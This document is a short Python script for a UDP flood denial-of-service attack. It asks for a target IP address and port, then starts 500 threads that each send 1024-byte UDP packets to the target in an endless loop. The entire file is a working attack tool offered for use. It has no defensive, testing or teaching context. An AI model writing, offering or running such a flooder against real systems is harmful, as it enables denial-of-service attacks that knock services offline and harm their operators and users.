import socket
import threading
try:
    def flood(target_ip, target_port):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes = b'\x100' * 1024
        payload = bytes

        running = True
        while running:
            sock.sendto(payload, (target_ip, target_port))
            print(f"""
        Sending packets to {target_ip}:{target_port}
            """)
    def main():
        target_ip = input("Enter target ip to send payload (0.0.0.0) >> ")
        target_port = int(input("Enter target port to send payload (1-65535) >> "))
        for i in range(500):
            threading.Thread(target=flood, args=(target_ip, target_port)).start()

except Exception as err:
    print(f"Error occured, Reason: {err}")
if __name__ == '__main__':
    main()